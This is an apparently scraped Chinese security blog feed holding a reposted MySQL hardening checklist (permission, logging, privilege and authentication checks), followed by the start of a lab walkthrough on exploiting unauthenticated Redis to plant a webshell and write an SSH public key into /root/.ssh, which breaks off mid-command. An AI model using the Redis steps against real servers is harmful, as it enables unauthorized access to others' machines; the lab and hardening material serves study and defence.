不要将数据库放在系统分区</h3><ul><li>Windows系统：</li></ul><p>直接检查是否将数据库放置在C盘。</p><ul><li>Linux系统：</li></ul><p>在终端连接上mysql数据库，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables where variable_name = &apos;datadir&apos;;</span><br></pre></td></tr></table></figure><p>然后返回shell命令行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h &lt;datadir&gt;</span><br></pre></td></tr></table></figure><p>其中datadir是上一条命令的返回值。</p><p>上述命令的返回值不应是<code>/、/var、/usr</code></p><h3 id="2-使用专用的最小权限账号运行mysql数据库进程"><a href="#2-使用专用的最小权限账号运行mysql数据库进程" class="headerlink" title="2. 使用专用的最小权限账号运行mysql数据库进程"></a>2. 使用专用的最小权限账号运行mysql数据库进程</h3><ul><li>Windows系统：</li></ul><p>直接打开任务管理器，查看运行mysql进程的操作系统账号，不能为administrator账号。</p><ul><li>Linux系统：</li></ul><p>Shell命令行运行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep mysql</span><br></pre></td></tr></table></figure><p>查看mysql服务的运行账号是否为root或其他高权限账号，如果是的，则需要创建一个非管理员专用账号来运行mysql服务。</p><h3 id="3-禁止使用mysql命令行历史记录"><a href="#3-禁止使用mysql命令行历史记录" class="headerlink" title="3. 禁止使用mysql命令行历史记录"></a>3. 禁止使用mysql命令行历史记录</h3><ul><li>Linux系统：</li></ul><p>执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;.mysql_history&quot;</span><br></pre></td></tr></table></figure><p>查看是否存在mysql的历史命令记录文件，如果存在，则需要进行如下加固：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）删除.mysql_history文件；</span><br><span class="line">（2）设置环境变量MYSQL_HISTFILE为/dev/null，并添加到shell的初始化脚本中，创建mysql_history到/dev/null的链接：</span><br><span class="line">ln -s /dev/null $HOME/.mysql_history</span><br></pre></td></tr></table></figure><h3 id="4-确保MYSQL-PWD环境变量未设置敏感信息"><a href="#4-确保MYSQL-PWD环境变量未设置敏感信息" class="headerlink" title="4. 确保MYSQL_PWD环境变量未设置敏感信息"></a>4. 确保MYSQL_PWD环境变量未设置敏感信息</h3><p>Windows系统下进入cmd命令行，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set</span><br></pre></td></tr></table></figure><p>查看是否设置了环境变量MYSQL_PWD。</p><p>Linux系统下使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep MYSQL_PWD /proc/*/environ</span><br></pre></td></tr></table></figure><p>查看MYSQL_PWD环境变量是否设置了敏感信息。</p><p>确认那个配置文件或脚本设置了MYSQL_PWD环境变量。</p><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><h3 id="1-使用数据库专用服务器"><a href="#1-使用数据库专用服务器" class="headerlink" title="1. 使用数据库专用服务器"></a>1. 使用数据库专用服务器</h3><p>使用专用的服务器安装mysql服务可以减少mysql服务的攻击面，尽量卸载或删除操作系统上的不必要的应用或服务，减少其他应用的安装可能给mysql的运行带来的安全风险。</p><h3 id="2-不要复用数据库账号"><a href="#2-不要复用数据库账号" class="headerlink" title="2. 不要复用数据库账号"></a>2. 不要复用数据库账号</h3><p>运行mysql服务的操作系统账号不要用来运行其他应用或服务，这样可以避免其他应用或服务器被攻击给mysql服务带来影响。</p><h3 id="3-历史命令行密码设置为不可见"><a href="#3-历史命令行密码设置为不可见" class="headerlink" title="3. 历史命令行密码设置为不可见"></a>3. 历史命令行密码设置为不可见</h3><p>使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u admin -p password</span><br></pre></td></tr></table></figure><p>连接mysql数据库服务，退出后查看历史命令，确认password是否为明文。</p><p>建议使用如下命令方式登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）先输入mysql -u admin -p</span><br><span class="line">（2）根据命令行提示输入密码；</span><br><span class="line">而不要在一整条命令中输入密码。</span><br><span class="line">另外要控制mysql配置文件访问权限。</span><br></pre></td></tr></table></figure><h2 id="0x03-文件权限控制"><a href="#0x03-文件权限控制" class="headerlink" title="0x03 文件权限控制"></a>0x03 文件权限控制</h2><h3 id="1-控制数据目录的访问权限"><a href="#1-控制数据目录的访问权限" class="headerlink" title="1. 控制数据目录的访问权限"></a>1. 控制数据目录的访问权限</h3><p>数据目录是mysql数据库存放的位置，在mysql命令行界面下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables where variable_name = &apos;datadir&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;datadir&gt;/.. | egrep &quot;^d[r|w|x]&#123;3&#125;------\s*.\s*mysql\s*mysql\s*\d*.*mysql&quot;</span><br></pre></td></tr></table></figure><p>其中<datadir>是第一条命令的执行结果</datadir></p><p>如果存在问题，linux环境下在终端执行如下命令进行加固：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 700 &lt;datadir&gt;</span><br><span class="line">chown mysql:mysql &lt;datadir&gt;</span><br></pre></td></tr></table></figure><h3 id="2-控制二进制日志文件的权限"><a href="#2-控制二进制日志文件的权限" class="headerlink" title="2. 控制二进制日志文件的权限"></a>2. 控制二进制日志文件的权限</h3><p>mysql的运行会产生很多日志，例如二进制日志、错误日志、慢查询日志等等，Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;log_bin_basename&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &lt;log_bin_basename&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;log_bin_basename.nnnnn&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="3-控制错误日志文件的权限"><a href="#3-控制错误日志文件的权限" class="headerlink" title="3. 控制错误日志文件的权限"></a>3. 控制错误日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;log_error&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &lt;log_error&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;log_error&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="4-控制慢查询日志文件的权限"><a href="#4-控制慢查询日志文件的权限" class="headerlink" title="4. 控制慢查询日志文件的权限"></a>4. 控制慢查询日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;slow_query_log_file&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &lt;slow_query_log_file&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;slow_query_log_file&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="5-控制通用日志文件的权限"><a href="#5-控制通用日志文件的权限" class="headerlink" title="5. 控制通用日志文件的权限"></a>5. 控制通用日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;general_log_file&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &lt;general_log_file&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;general_log_file&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="6-控制审计日志文件的权限"><a href="#6-控制审计日志文件的权限" class="headerlink" title="6. 控制审计日志文件的权限"></a>6. 控制审计日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables where variable_name =  &apos;audit_log_file&apos;;</span><br></pre></td></tr></table></figure><p>在终端执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;audit_log_file&gt; | egrep &quot;^-rw[-x]rw[-x][-r][-w][-x][ \t]*[0-9][ \t]*mysql[</span><br><span class="line">\t]*mysql.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;audit_log_file&gt;</span><br><span class="line">chown mysql:mysql &lt;audit_log_file&gt;</span><br></pre></td></tr></table></figure><h2 id="0x04-通用安全"><a href="#0x04-通用安全" class="headerlink" title="0x04 通用安全"></a>0x04 通用安全</h2><h3 id="1-安装最新的补丁"><a href="#1-安装最新的补丁" class="headerlink" title="1. 安装最新的补丁"></a>1. 安装最新的补丁</h3><p>在mysql命令行下查询MySQL的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES WHERE Variable_name LIKE &quot;version&quot;;</span><br></pre></td></tr></table></figure><p>确认是否由需要安装的补丁包，如果有请安装。</p><h3 id="2-删除test数据库"><a href="#2-删除test数据库" class="headerlink" title="2. 删除test数据库"></a>2. 删除test数据库</h3><p>Mysql数据库默认安装好后，存在一个名为test的数据库，如果存在，请执行如下命令删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Drop database “test”</span><br></pre></td></tr></table></figure><h3 id="3-确保读取本地文件的参数设置为失效"><a href="#3-确保读取本地文件的参数设置为失效" class="headerlink" title="3. 确保读取本地文件的参数设置为失效"></a>3. 确保读取本地文件的参数设置为失效</h3><p>Mysql命令行下，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES WHERE Variable_name = &apos;local_infile&apos;;</span><br></pre></td></tr></table></figure><p>查看结果是否为OFF。</p><p>如果该命令为ON，则数据库用户可以通过LOAD DATA INFILE 或者 SELECT local_file 读取到数据库所在操作系统本地的文件，在这种情况下，需要在mysql配置文件中新增一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Local-infile=0；</span><br></pre></td></tr></table></figure><p>然后重启数据库服务。</p><h2 id="0x05-权限配置"><a href="#0x05-权限配置" class="headerlink" title="0x05 权限配置"></a>0x05 权限配置</h2><h3 id="1-控制可以访问所有数据库的账号"><a href="#1-控制可以访问所有数据库的账号" class="headerlink" title="1. 控制可以访问所有数据库的账号"></a>1. 控制可以访问所有数据库的账号</h3><p>Mysql数据库下的user表和db表中存放着可以授予数据库用户的权限，确保只有管理员账号才能访问所有数据库。可以访问mysql数据库的用户或许可以查看密码哈希值、修改用户权限等等。</p><p>使用如下sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT user, host FROM mysql.user</span><br><span class="line">WHERE (Select_priv = &apos;Y&apos;) OR (Insert_priv = &apos;Y&apos;) OR (Update_priv = &apos;Y&apos;)</span><br><span class="line">OR (Delete_priv = &apos;Y&apos;)  OR (Create_priv = &apos;Y&apos;)  OR (Drop_priv = &apos;Y&apos;);</span><br><span class="line">SELECT user, host FROM mysql.db WHERE db = &apos;mysql&apos;</span><br><span class="line">AND ((Select_priv = &apos;Y&apos;) OR (Insert_priv = &apos;Y&apos;) OR (Update_priv = &apos;Y&apos;)</span><br><span class="line">OR (Delete_priv = &apos;Y&apos;) OR (Create_priv = &apos;Y&apos;) OR (Drop_priv = &apos;Y&apos;));</span><br></pre></td></tr></table></figure><p>确保返回结果只能是数据库管理员账号。</p><h3 id="2-限制非管理员用户的权限"><a href="#2-限制非管理员用户的权限" class="headerlink" title="2. 限制非管理员用户的权限"></a>2. 限制非管理员用户的权限</h3><p>Mysql.user表中的权限列有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_priv：表示是否允许用户读取数据库所在主机的本地文件；</span><br><span class="line">Process：表示是否允许用户查询所有用户的命令执行信息；</span><br><span class="line">Super_priv：表示用户是否有设置全局变量、管理员调试等高级别权限；</span><br><span class="line">Shutdown_priv：表示用户是否可以关闭数据库；</span><br><span class="line">Create_user_priv：表示用户是否可以创建或删除其他用户；</span><br><span class="line">Grant_priv：表示用户是否可以修改其他用户的权限；</span><br></pre></td></tr></table></figure><p>应确保只有数据库管理员才有上述权限，使用如下sql语句查看拥有各个权限的数据库账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select user, host from mysql.user where File_priv = &apos;Y&apos;;</span><br><span class="line">select user, host from mysql.user where Process_priv = &apos;Y&apos;;</span><br><span class="line">select user, host from mysql.user where Process_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.user WHERE Shutdown_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.user WHERE Create_user_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.user WHERE Grant_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.db WHERE Grant_priv = &apos;Y&apos;;</span><br></pre></td></tr></table></figure><p>确保查询结果中不存在非管理员用户。</p><p>如果存在非管理员用户，使用如下命令进行权限回收：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REVOKE FILE ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE PROCESS ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE SUPER ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE SHUTDOWN ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE CREATE USER ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE GRANT OPTION ON *.* FROM &lt;user&gt;;</span><br></pre></td></tr></table></figure><p>其中user为上述查询到的非管理员用户。</p><h3 id="3-合理控制DML-DDL操作授权"><a href="#3-合理控制DML-DDL操作授权" class="headerlink" title="3. 合理控制DML/DDL操作授权"></a>3. 合理控制DML/DDL操作授权</h3><p>DML/DDL语句包括创建或修改数据库结构的权限，例如insert、update、delete、create、drop和alter语句，在任何数据库中都要控制用户的此类权限，确保只授权给有业务需求的非管理员用户。Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT User,Host,Db FROM mysql.db WHERE Select_priv=&apos;Y&apos;</span><br><span class="line">OR Insert_priv=&apos;Y&apos; OR Update_priv=&apos;Y&apos; OR Delete_priv=&apos;Y&apos; OR Create_priv=&apos;Y&apos;</span><br><span class="line">OR Drop_priv=&apos;Y&apos; OR Alter_priv=&apos;Y&apos;;</span><br></pre></td></tr></table></figure><p>上述查询到的用户只能对特地的数据库才有相关的权限，使用如下命令进行相关权限的回收：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REVOKE SELECT ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE INSERT ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE UPDATE ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE DELETE ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE CREATE ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE DROP ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE ALTER ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br></pre></td></tr></table></figure><p>其中<user>为查询到的未授权的用户，host为相关主机，database为相关数据库。</user></p><h2 id="0x06-审计和日志"><a href="#0x06-审计和日志" class="headerlink" title="0x06 审计和日志"></a>0x06 审计和日志</h2><h3 id="1-开启错误日志审计功能"><a href="#1-开启错误日志审计功能" class="headerlink" title="1. 开启错误日志审计功能"></a>1. 开启错误日志审计功能</h3><p>错误日志包括数据库运行和停止过程中的一系列活动信息，有助于分析数据库运行过程中的一些异常活动，一般情况下需要开启错误日志记录功能，使用如下命令查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW variables LIKE &apos;log_error&apos;;</span><br></pre></td></tr></table></figure><p>确保返回结果为非空，如果为空，需要在mysql数据库配置文件中增加相关配置。</p><h3 id="2-确保日志存放在非系统区域"><a href="#2-确保日志存放在非系统区域" class="headerlink" title="2. 确保日志存放在非系统区域"></a>2. 确保日志存放在非系统区域</h3><p>日志文件随着数据库的运行会不断增加，如果存放在系统区域，则会影响系统的正常运行，使用如下命令进行查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@global.log_bin_basename;</span><br></pre></td></tr></table></figure><p>确保返回结果不是如下路径：/、/var、/usr</p><h3 id="3-关闭原始日志功能"><a href="#3-关闭原始日志功能" class="headerlink" title="3. 关闭原始日志功能"></a>3. 关闭原始日志功能</h3><p>原始日志选项会决定一些敏感信息是否会被明文写进日志中，例如查询日志、慢查询日志、二进制日志，确保数据库配置文件中存在如下配置项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log-raw = OFF</span><br></pre></td></tr></table></figure><h2 id="0x07-认证"><a href="#0x07-认证" class="headerlink" title="0x07 认证"></a>0x07 认证</h2><h3 id="1-Old-passwords环境变量设置"><a href="#1-Old-passwords环境变量设置" class="headerlink" title="1. Old_passwords环境变量设置"></a>1. Old_passwords环境变量设置</h3><p>Old_passwords决定了使用PASSWORD()函数和IDENTIFIED BY 、CREATE USER 、GRANT 等语句是时的hash算法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - authenticate with the mysql_native_password plugin</span><br><span class="line">1 - authenticate with the mysql_old_password plugin</span><br><span class="line">2 - authenticate with the sha256_password plugin</span><br></pre></td></tr></table></figure><p>设置为mysql_old_password代表弱hash算法，可以快速通过密码字典进行暴力破解。使用如下命令查询相关值：</p><p>SHOW VARIABLES WHERE Variable_name = ‘old_passwords’;</p><p>确保返回值不为1。</p><h3 id="2-secure-auth-选项设置"><a href="#2-secure-auth-选项设置" class="headerlink" title="2. secure_auth 选项设置"></a>2. secure_auth 选项设置</h3><p>如果客户端采用Old_passwords发起连接请求，如果服务器端设置了secure_auth，则客户端会拒绝连接请求，可以根据安全需求在配置文件中做相应配置。</p><h3 id="3-密码保存"><a href="#3-密码保存" class="headerlink" title="3. 密码保存"></a>3. 密码保存</h3><p>确保密码没有明文保存在全局配置文件中。</p><h3 id="4-确保所有用户都要求使用非空密码登录"><a href="#4-确保所有用户都要求使用非空密码登录" class="headerlink" title="4. 确保所有用户都要求使用非空密码登录"></a>4. 确保所有用户都要求使用非空密码登录</h3><p>执行如下语句查询是否有用户不需要密码即可登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT User,host</span><br><span class="line">FROM mysql.user</span><br><span class="line">WHERE (plugin IN(&apos;mysql_native_password&apos;, &apos;mysql_old_password&apos;)</span><br><span class="line">AND (LENGTH(Password) = 0</span><br><span class="line">OR Password IS NULL))</span><br><span class="line">OR (plugin=&apos;sha256_password&apos; AND LENGTH(authentication_string) = 0);</span><br></pre></td></tr></table></figure><h3 id="5-不存在空账号"><a href="#5-不存在空账号" class="headerlink" title="5. 不存在空账号"></a>5. 不存在空账号</h3><p>使用如下命令查询是否存在空账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user,host FROM mysql.user WHERE user = &apos;&apos;;</span><br></pre></td></tr></table></figure><h2 id="0x08-网络设置"><a href="#0x08-网络设置" class="headerlink" title="0x08 网络设置"></a>0x08 网络设置</h2><p>如果mysql数据库服务器与应用是跨信任域部署的，则需要考虑在数据库服务器与应用服务器之间建立ssl通道进行数据传输，不过这种场景一般很少见，在此不详细描述。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MySQL安全配置&quot;&gt;&lt;a href=&quot;#MySQL安全配置&quot; class=&quot;headerlink&quot; title=&quot;MySQL安全配置&quot;&gt;&lt;/a&gt;MySQL安全配置&lt;/h1&gt;&lt;p&gt;本文转载自 &lt;a href=&quot;https://blog.csdn.net/ilnat
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis未授权访问</title>
    <link href="http://bai-ren-1.github.io/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://bai-ren-1.github.io/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2020-03-03T08:30:25.000Z</published>
    <updated>2020-03-03T09:24:07.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><p>很简单的内容，这里只做第一个实验。后面的实验做法网上很多。通过三种攻击介绍Redis未授权访问的利用。</p><h2 id="Redis写Webshell"><a href="#Redis写Webshell" class="headerlink" title="Redis写Webshell"></a>Redis写Webshell</h2><p>首先在靶机Ubuntu和攻击机Kali上都配置Redis环境。查看一下两台机器的ip环境，靶机的ip为192.168.3.74：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/ubuntu%E7%9A%84ip.png" alt></p><p>攻击机的ip为：192.168.3.66：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E7%9A%84ip.png" alt></p><p>在靶机上开启我们的Redis服务：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/ubuntu%E5%BC%80%E6%9C%8D%E5%8A%A1.png" alt></p><p>然后我们在攻击机上通过命令连接redis服务：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E8%BF%9E%E6%8E%A5.png" alt></p><p>可以看到我们能连接到Redis服务器上，Redis的服务是暴露在外的。那么不多说直接设置目录然后写入shell：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5shell.png" alt></p><p>然后就可以在靶机上看到了被植入了一个Webshell：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5.png" alt></p><p>第一个实验写入Webshell到此成功执行。</p><h2 id="Redis写SSH公钥"><a href="#Redis写SSH公钥" class="headerlink" title="Redis写SSH公钥"></a>Redis写SSH公钥</h2><p>首先我们在攻击机上生成公私钥对，passphrase设置为空：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5.png" alt></p><p>我们把公钥写入一个文件1.txt中：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6.png" alt></p><p>攻击机连接到靶机并把保存公钥的1.txt写入Redis中：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E8%AE%BE%E7%BD%AE%E5%85%AC%E9%92%A5.png" alt></p><p>使用命令得到Redis的路径后修改到SSH公钥保存的目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.74:6379&gt; CONFIG GET dir</span><br><span class="line">1)"dir"</span><br><span class="line">2)"/home/chenxiaoyi"</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dir /root/.ssh</span><br><span 